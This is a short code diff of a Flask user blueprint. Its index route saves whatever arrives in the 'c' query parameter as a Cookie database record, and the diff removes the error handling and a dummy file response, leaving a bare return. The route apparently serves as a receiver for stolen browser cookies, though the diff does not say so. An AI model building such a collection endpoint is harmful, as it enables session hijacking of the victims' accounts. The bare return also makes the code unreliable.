@@ -15,21 +15,12 @@ bp = Blueprint('user', __name__, url_prefix="/api/v1/user")
 
 @bp.route("/")
 def index():
-    try:
-        data = request.args.get("c")
-        cookie = Cookie()
-        cookie.cookie = data
-        db_session.add(cookie)
-        db_session.commit()
-    except Exception:
-        pass
-
-    strIO = StringIO()
-    strIO.write('test')
-    strIO.seek(0)
-    return send_file(strIO,
-                     attachment_filename="testing.txt",
-                     as_attachment=True)
+    data = request.args.get("c")
+    cookie = Cookie()
+    cookie.cookie = data
+    db_session.add(cookie)
+    db_session.commit()
+    return
 
 
 @bp.route('<user_id>')
